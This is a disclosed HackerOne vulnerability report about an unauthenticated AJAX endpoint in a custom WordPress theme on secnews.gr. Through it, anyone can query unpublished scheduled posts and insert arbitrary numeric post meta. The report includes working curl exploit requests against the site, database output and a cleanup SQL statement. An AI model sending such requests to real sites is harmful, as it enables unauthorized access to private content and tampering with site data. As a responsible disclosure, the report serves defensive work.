# Querying private posts and changing post meta

## Report Details
- **Report ID**: 157412
- **URL**: https://hackerone.com/reports/157412
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-08-07T12:53:59.669Z
- **Disclosed**: 2016-08-09T07:15:55.929Z

## Reporter
- **Username**: sameoldstory
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: secnews

## Vulnerability Information
Summary
---
Unauthenticated user can run arbitrary post queries and insert arbitrary numeric post meta via vulnerable `/wp-content/themes/SecNews-NewCustom/functions/ajax.php` file.

I'm including two exploits in one report because the fix for both is the same, i.e. delete `ajax.php`.


Run arbitrary post queries
---

Consider this request:
```
curl https://www.secnews.gr/wp-content/themes/SecNews-NewCustom/functions/ajax.php \
--data 'action=sort&loop=main loop&currentquery[key1]=value1&currentquery[key2]=value2'
```

It executes a [WP_Query](https://codex.wordpress.org/Class_Reference/WP_Query) against the database with `array('key1' => 'value1', 'key2' => 'value2')` as the argument.

Attacker can exploit this, for example, to see posts that are scheduled to be published in the future, i.e. posts that are not public yet:

```
curl https://www.secnews.gr/wp-content/themes/SecNews-NewCustom/functions/ajax.php \
--data 'action=sort&loop=main loop&currentquery[post_status]=future'
```

For example "Δείτε τα πιο Geeky Raspberry Pi Smartwatches!" by Bl4ckPr0xyon will be published on 15.08.2016 at 13:21, i.e. in 8 days from today.


Insert arbitrary numeric post meta
---

Consider this request:
```
curl https://www.secnews.gr/wp-content/themes/SecNews-NewCustom/functions/ajax.php \
--data 'id=100000&action=rate&meta=test&rating=42'
```

The request parameters get passed to [add_post_meta()](https://developer.wordpress.org/reference/functions/add_post_meta/) function, which inserts a row to the post's meta with an arbitrary key and arbitrary value. The value can only be a number though.

```
mysql> select * from wp_postmeta where meta_key = "test";
+---------+----------+------------+
| post_id | meta_key | meta_value |
+---------+----------+------------+
|  100000 | test     | 42         |
+---------+----------+------------+
```

This can be used by attacker to alter behavior of plugins and themes. For example:
 * I removed background image from https://www.secnews.gr/100000 by setting `_bg_color_override` to `1` in the post meta.
 * I set shares count to `-56994` at https://www.secnews.gr/100000 by changing `mashsb_shares` and `mashsb_timestamp` meta of the post.

Potentially this can be used to:
 * Change booleans, counters and timestamps in other plugins leading to information disclosure or website defacement.
 * Unnoticeably fill the database with garbage data until the disk space is full.

Affected posts
---

While looking for vulnerabilities I changed some meta for posts 95513, 100000 and 104030. You can clean it up with something like this:
`DELETE * FROM wp_postmeta WHERE post_id IN (95513, 100000, 104030) AND meta_key IN ('_bg_color_override', 'mashsb_shares', 'mashsb_timestamp');`

## Attachments
No attachments
